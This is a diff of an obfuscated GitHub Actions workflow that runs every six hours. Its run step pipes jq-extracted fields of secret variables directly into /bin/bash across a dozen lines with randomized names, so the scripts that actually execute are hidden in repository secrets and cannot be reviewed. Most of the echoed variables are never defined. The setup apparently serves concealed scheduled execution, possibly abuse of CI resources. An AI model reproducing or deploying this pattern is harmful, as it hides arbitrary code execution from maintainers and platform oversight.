@@ -1,9 +1,9 @@
 name: ruanxiaoer19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
-
+    - cron: '5 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: ruanxiaoer19871010
         env:
-          a0062: ${{ secrets.a0062 }}
+          duqm01: ${{ secrets.duqm01 }}
         run: |
-          echo $a0062 | jq -r .paxr86 | /bin/bash
-          echo $xdptt35 | jq -r .mv96 | /bin/bash
-          echo $cp239 | jq -r .dec49386 | /bin/bash
-          echo $lstt95 | jq -r .vu8335 | /bin/bash
-          echo $hzopp3924 | jq -r .nghm9010 | /bin/bash
+          echo $duqm01 | jq -r .eu0 | /bin/bash
+          echo $itqd55143 | jq -r .eo68 | /bin/bash
+          echo $p6 | jq -r .dsjy58072 | /bin/bash
+          echo $kngn960 | jq -r .i106 | /bin/bash
+          echo $vnzx210 | jq -r .afu576 | /bin/bash
+          echo $gr52 | jq -r .chmz74889 | /bin/bash
+          echo $o3 | jq -r .yryhq3 | /bin/bash
+          echo $fbdv970 | jq -r .wd12759 | /bin/bash
+          echo $pvpya0122 | jq -r .uvnsl253 | /bin/bash
+          echo $vll899 | jq -r .c1969 | /bin/bash
+          echo $gxuf78 | jq -r .wfk47 | /bin/bash
+          echo $fdl453 | jq -r .vdvq13953 | /bin/bash
 
